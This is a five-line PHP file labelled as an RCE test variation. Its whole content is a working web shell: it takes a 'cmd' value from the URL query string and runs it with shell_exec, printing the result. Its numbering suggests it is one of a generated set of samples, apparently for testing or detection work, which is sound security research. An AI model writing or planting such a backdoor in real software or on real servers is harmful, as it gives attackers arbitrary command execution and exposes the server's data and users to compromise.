<?php
// RCE test variation #275
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>